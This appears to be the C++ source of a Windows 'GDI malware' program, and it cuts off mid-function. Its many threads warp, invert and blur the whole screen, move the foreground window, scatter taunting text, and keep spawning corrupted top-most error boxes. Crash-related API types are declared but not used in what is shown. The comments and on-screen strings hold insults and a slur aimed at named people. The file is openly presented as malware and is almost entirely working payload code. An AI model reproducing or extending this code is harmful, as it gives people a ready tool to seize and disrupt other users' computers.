﻿// xzhgowbweivqm.cpp : このファイルには 'main' 関数が含まれています。プログラム実行の開始と終了がそこで行われます。
//

#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#include <tchar.h>
#include "resource.h"
#define M_PI   3.14159265358979323846264338327950288
HCRYPTPROV hProv;
INT random() {
	if (hProv == NULL)
		if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	INT nOut;
	CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
	return nOut & 0x7fffffff;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int stage = 0;
int r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to Malsteve527 for the Hue function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}

	return RGB(r, g, b);
}
HWND hDlg;
HANDLE glitchmsgbox1;
int MessageBoxWidth, MessageBoxHeight;
BOOL AlreadyStartGlitch = false;
HHOOK hHook = NULL;
BOOL CALLBACK EnumProc114(HWND hWnd, LPARAM lParam) {
	SetWindowTextA(hWnd, "");
	ShowWindow(hWnd, 0);
	EnableWindow(hWnd, FALSE);
	return 1;
}
DWORD WINAPI msgglitch(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(hDlg);
		HDC hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), MessageBoxWidth, MessageBoxHeight, 1, 32 };
		PRGBQUAD rgbScreen = { 0 };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < MessageBoxWidth * MessageBoxHeight; i++) {
			int luckynum = rand() % 30;
			if (luckynum <= 10) { rgbScreen[i].rgb = 0; }
			else if (luckynum > 10 && luckynum <= 20) {
				rgbScreen[i].rgb = 7237230;
			}
			else {
				rgbScreen[i].rgb = 14474460;
			}
		}
		for (int x = 0; x < MessageBoxWidth; x += 50) {
			for (int y = 0; y < MessageBoxHeight; y += 50) {
				StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 25, 25, SRCCOPY);
			}
		}
		BitBlt(hdc, 0, 0, MessageBoxWidth, MessageBoxHeight, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(10);
	}
}
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		if (AlreadyStartGlitch == true) {
			return 114514;
		}
		AlreadyStartGlitch = true;
		hDlg = (HWND)wParam;
		RECT rect;
		GetWindowRect(hDlg, &rect);
		MessageBoxWidth = rect.right - rect.left;
		MessageBoxHeight = rect.bottom - rect.top;
		EnumChildWindows(hDlg, EnumProc114, 0);
		glitchmsgbox1 = CreateThread(0, 0, msgglitch, 0, 0, 0);
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}
DWORD WINAPI msg(LPVOID lpParam) {
	while (1) {
		hHook = SetWindowsHookEx(WH_CBT, &CBTProc, NULL, GetCurrentThreadId());
		MessageBoxA(NULL, "", "Are you that retarded?", MB_ICONERROR | MB_ABORTRETRYIGNORE | MB_TOPMOST);
		if (hHook != NULL) {
			UnhookWindowsHookEx(hHook);
		}
		AlreadyStartGlitch = false;
		TerminateThread(glitchmsgbox1, 0);
		CloseHandle(glitchmsgbox1);
		Sleep(10);
	}
	return 0;
}
VOID WINAPI ApplyDistortion(HDC hdcScreen, int width, int height, float time) { //credits to UltraDasher965 or Number333.. idk. fuck
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
	SelectObject(hdcMem, hBmp);
	BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

	for (int y = 0; y < height; y++) {
		int offsetX = (int)(20 * sin((y + time) * 0.05f));
		BitBlt(hdcScreen, 0, y, width, 1, hdcMem, offsetX, y, SRCCOPY);
	}

	DeleteObject(hBmp);
	DeleteDC(hdcMem);
}
DWORD WINAPI bouncy(LPVOID lpParam) //credits to N17Pro3426
{
	int x = 0;
	int y = 0;
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	while (1)
	{
		HWND hwnd = GetForegroundWindow();
		x += incrementor * signX;
		y += incrementor * signY;
		SetWindowPos(hwnd, 0, x, y, x, y, SWP_NOSIZE);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}
		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}
		if (y == 0)
		{
			signY = 2;
		}
		if (x == 0)
		{
			signX = 2;
		}
		Sleep(10);
		DeleteObject(hwnd);
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += x ^ y ^ x + y;
			rgbScreen[i].rgb += ((rgbScreen[i].r | rgbScreen[i].g) | ((rgbScreen[i].g | rgbScreen[i].b) << 16) | ((rgbScreen[i].b | rgbScreen[i].r << 32)));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI blockz(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	PRGBQUAD rgbScreen = NULL;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	while (1) {
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < 5; i++) {
			INT x = rand() % w;
			INT y = rand() % h;

			INT dx = rand() % w;
			INT dy = rand() % h;
			INT sw = 100 + rand() % 200;
			INT sh = 100 + rand() % 200;

			BitBlt(hdcScreen, x, y, sw, sh, hdcMem, dx, dy, !(rand() % 2) ? SRCAND : SRCPAINT);
			Sleep(10);
		}
		for (INT i = 0; i < 5; i++) {
			INT nBlockSize = rand() % 129 + 128;
			INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

			INT x2 = rand() % (w - nBlockSize);
			INT y2 = rand() % (h - nBlockSize);

			StretchBlt(hdcScreen, x2 - (nNewBlockSize - nBlockSize) / 2, y2 - (nNewBlockSize - nBlockSize) / 2, nNewBlockSize, nNewBlockSize, hdcMem, x2, y2, nBlockSize, nBlockSize, !(rand() % 2) ? SRCAND : SRCPAINT);
			Sleep(10);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(1);
	}
	ReleaseDC(NULL, hdcScreen);
	DeleteDC(hdcMem);
	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	INT xxx = 0;
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].r += xxx + cbrt((x + i) ^ (y + i));
			rgbScreen[i].g += xxx + sqrt((x + i) ^ (y + i));
			rgbScreen[i].b += xxx + cbrt((x + i) ^ (y + i));
		}
		xxx += 2;
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		BitBlt(hdcScreen, rand() % 10, rand() % 10, w, h, hdcMem, rand() % 10, rand() % 10, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2dot1(LPVOID lpParam) { //credits to Number333
	HDC hScreen = GetDC(NULL);
	HDC hMemDC = CreateCompatibleDC(hScreen);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
	SelectObject(hMemDC, hBitmap);

	float angle = 0.0f;
	float time = 0.0f;
	while (1)
	{
		HDC hScreen = GetDC(NULL);
		BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
		SetGraphicsMode(hScreen, GM_ADVANCED);

		XFORM xform;
		float rad = angle * 3.14159f / 1.01f;
		xform.eM11 = atan(rad);
		xform.eM12 = sin(rad);

		xform.eM21 = -sin(rad);
		xform.eM22 = atan(rad);
		xform.eDx = (1 - xform.eM11) * (screenWidth / 2) - xform.eM21 * (screenHeight / 2);
		xform.eDy = (1 - xform.eM22) * (screenHeight / 2) - xform.eM12 * (screenWidth / 2);
		SetWorldTransform(hScreen, &xform);

		BitBlt(hScreen, 0, 0, screenWidth, screenHeight, hMemDC, 0, 0, SRCCOPY);
		ModifyWorldTransform(hScreen, NULL, MWT_IDENTITY);

		BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
		angle += 2.f;
		if (angle >= 360.0f) angle -= 360.0f;
		{
			HDC hdcScreen = GetDC(NULL);
			ApplyDistortion(hdcScreen, screenWidth, screenHeight, time);
			BitBlt(hdcScreen, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
			time += 0.1f;
			ReleaseDC(NULL, hdcScreen);
		}
	}
	DeleteObject(hBitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hScreen);
}
DWORD WINAPI circle(LPVOID lpParam) { //credits to Maxi toys
	HDC dc = GetDC(NULL);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	float i2 = 0;
	int scnln = 0;

	int circx[10] = { 0 }, circy[10] = { 0 }, circsiz[10] = { 0 };
	for (int i = 0; i < 10; i++) {
		circx[i] = rand() % w;
		circy[i] = rand() % h;
		circsiz[i] = 150 + (rand() % 50);
	}
	while (1) {
		for (int i = 0; i < 10; i++) {
			HRGN r = CreateEllipticRgn(circx[i] + sin(i2 / (i + 1)) * cos(i2 / (i + 1) / 4) * 4 * circsiz[i], circy[i] + cos(i2 / (i + 1)) * cos(i2 / (i + 1) / 4) * 4 * circsiz[i], circx[i] + sin(i2 / (i + 1)) * cos(i2 / (i + 1) / 4) * 4 * circsiz[i] + circsiz[i], circy[i] + cos(i2 / (i + 1)) * cos(i2 / (i + 1) / 4) * 4 * circsiz[i] + circsiz[i]);
			SelectObject(dc, r);
			PatBlt(dc, 0, 0, w, h, PATINVERT);
			ReleaseDC(0, dc);
			DeleteObject(r);
		}
		i2++;
	}
	return 0x00;
}
DWORD WINAPI customiconradius(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int radius = 110, angle = 0, count = 0;
	int sx = 1, sy = 1, x = 10, y = 10;;
	int incrementor = 1;
	while (1) {
		HDC hdc = GetDC(0);
		x += (incrementor * sx);
		y += (incrementor * sy);
		HICON hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
		DrawIcon(hdc, x + (radius * cos(angle * M_PI / 18)), y + (radius * sin(angle * M_PI / 18)), hIcon);
		if (y >= h)
		{
			sy = -1;
		}
		if (x >= w)
		{
			sx = -1;
		}

		if (y <= 0)
		{
			sy = 1;
		}
		if (x <= 0)
		{
			sx = 1;
		}

		angle++;
		if (count == 10) {
			count = 0;
			Sleep(10);
		}
		else {
			count++;
		}

		ReleaseDC(0, hdc);
		DestroyIcon(hIcon);
		DeleteObject(hIcon);
		DeleteDC(hdc);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w / 4;
	int hs = h / 4;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				//CenterX and CenterY
				int cx = (x - (w / 5));
				int cy = (y - (h / 5));

				//2D Rotating Matrix
				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				//Pattern
				int fx = (zx + i) | (zy + i);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbBlue += fx;
				rgbquad[index].rgbRed ^= fx;
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI blur1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (1) {
		hdc = GetDC(0);
		//BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(dcCopy, -20, -20, w + 40, h + 40, hdc, 0, 0, w, h, SRCPAINT);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w;
	int hs = h;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				INT d = 128 + i;
				INT cx = x - w / 2, cy = y - h / 2; // PEMDAS! Division comes before subtraction, so that will work

				INT dx = cx * cx, dy = cy * cy;
				INT fx = d + (d * sin(cbrt(dx + dy) / d));

				rgbquad[index].rgbRed += fx + 16;
				rgbquad[index].rgbGreen += fx + 32;
				rgbquad[index].rgbBlue += fx + 64;
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI blur2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (1) {
		hdc = GetDC(0);
		int a = rand() % w, b = rand() % h;
		BitBlt(dcCopy, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, !(rand() % 2) ? SRCCOPY : SRCPAINT);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w / 1;
	int hs = h / 5;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				INT d = 128 + i;
				INT cx = x - w / 2, cy = y - h / 2; // PEMDAS! Division comes before subtraction, so that will work

				INT dx = cx * cx, dy = cy * cy;
				INT fx = d + (d * sin(cbrt(dx + dy) / d));

				rgbquad[index].rgbRed *= fx + 16;
				rgbquad[index].rgbGreen += fx + 32;
				rgbquad[index].rgbBlue += fx + 64;
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, NOTSRCCOPY);
		if ((rand() % 100 + 1) % 67 == 0) RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI textoutz(LPVOID lpParam) { //some of the texts here is just copied from https://maxi2022gt.github.io/MaxisWebsite
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		LPCSTR text[12] = {
			"xzhgowbweivqm", "Executioner", "xdde", "aaaaAAACHOO!!",
			"095734890495657849035", "I hate you venra",
			"YOUR MALWARES ARE ASS!!!", "finale is better than solaris",
			"Sol? reirse.", "finale is better. convex is trash.",
			"venra is probably skidding from purgatorium", "I LOVE YOU EXECUTIONER CAN U MARRY ME"
		};
		int thing = rand() % 12;
		SetTextColor(hdc, Hue(3));
		SetBkColor(hdc, RGB(2, 2, 2));
		HFONT font = CreateFontA(50, 30, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Arial");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % w, rand() % h, text[thing], strlen(text[thing]));
		ReleaseDC(0, hdc);
		DeleteObject(font);
		DeleteDC(hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	int ws = w;
	int hs = h;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				INT d = 128 + i;
				INT cx = x - w / 2, cy = y - h / 2; // PEMDAS! Division comes before subtraction, so that will work

				INT dx = cx * cx, dy = cy * cy;
				INT fx = d + (d * sin(sqrt(dx + dy) / d)) * x + y;

				rgbquad[index].rgbRed = fx + 16;
				rgbquad[index].rgbBlue = fx + 32;
				rgbquad[index].rgbRed = fx + 64;
			}
		}

		i++; angle += 0.01f;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
		BitBlt(hdc, rand() % 40 - 20, 0, w, h, hdcCopy, 0, rand() % 40 - 20, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader7(LPVOID lpParam) { //Fuck you camellia aka skidilia
	RGBQUAD rgbquadCopy; HBRUSH hBrush = NULL; int i = 0, rop = 0;
	while (1) {
		HDC hdc = GetDC(0);
		HDC hdc2 = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
		RGBQUAD* rgbquad = NULL; HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		DOUBLE angle = 0.f;
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				int fx = (x & y);

				rgbquad[index].rgbRed = fx + 16;
				rgbquad[index].rgbGreen = fx + 32;
				rgbquad[index].rgbRed = fx + 64;
			}
		}
		for (int y = 0; y < h; y += 25) {
			rop = SRCCOPY; int rnd = rand() % 31;
			if (rnd >= 10 && rnd < 20) { rop = SRCCOPY; }
			else if (rnd >= 20 && rnd < 30) { rop = SRCCOPY; }
			int rnd1 = 10 - (rand() % 21);
			StretchBlt(hcdc, -rnd1, y, w + rnd1, 25, hcdc, rnd1, y, w, 25, rop);
		}
